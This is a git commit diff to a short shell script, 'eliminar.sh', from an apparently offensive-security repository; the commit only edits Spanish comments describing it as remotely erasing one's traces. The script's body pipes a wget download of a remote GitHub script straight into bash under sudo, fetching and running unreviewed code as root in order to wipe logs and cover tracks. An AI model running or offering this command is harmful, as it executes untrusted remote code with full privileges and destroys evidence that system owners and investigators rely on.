658865fb72bb77efb1802b9ddc5f0f560e42b070
hackingyseguridad <antonio_taboada@hotmail.es>
2026-02-10 20:14:13 +0100

    Update eliminar.sh

--- eliminar.sh
+++ eliminar.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-# Borrar rastro en remoto
-# Antonio Taboada 2023 - hackingyseguridad.com
+# ejecutar borrar rastro enremoto, sin instalar nada
+# @antonio_taboada- hackingyseguridad.com
 cd /tmp/
 sudo wget https://raw.githubusercontent.com/hackingyseguridad/borrarastro/master/borrar.sh -q -O - | bash
